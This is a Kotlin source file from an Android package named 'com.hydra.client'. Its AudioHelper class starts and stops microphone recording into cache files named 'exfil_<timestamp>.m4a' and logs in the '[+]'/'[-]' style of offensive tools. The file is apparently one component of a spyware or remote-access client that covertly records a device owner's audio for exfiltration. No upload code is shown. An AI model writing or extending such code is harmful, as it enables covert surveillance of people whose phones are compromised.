package com.hydra.client

import android.media.MediaRecorder
import android.util.Log
import java.io.File
import java.io.IOException

class AudioHelper(private val context: android.content.Context) {
    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null

     fun startRecording(): String? {
        try {
            audioFile = File(context.cacheDir, "exfil_${System.currentTimeMillis()}.m4a")
            
            mediaRecorder?.release()
            
            mediaRecorder = MediaRecorder().apply {
                reset() 
                // Change MIC to DEFAULT for better emulator compatibility
                setAudioSource(MediaRecorder.AudioSource.DEFAULT) 
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(audioFile?.absolutePath)
                
                prepare()
                start()
            }
            Log.i("Hydra-Audio", "[+] Recording started")
            return audioFile?.absolutePath
        } catch (e: Exception) {
            Log.e("Hydra-Audio", "[-] Recorder Error: ${e.message}")
            mediaRecorder?.release()
            mediaRecorder = null
            return null
        }
    }

    fun stopRecording(): String? {
        return try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            Log.i("Hydra-Audio", "[+] Recording stopped")
            audioFile?.absolutePath
        } catch (e: Exception) {
            Log.e("Hydra-Audio", "[-] Error stopping recorder: ${e.message}")
            null
        }
    }
}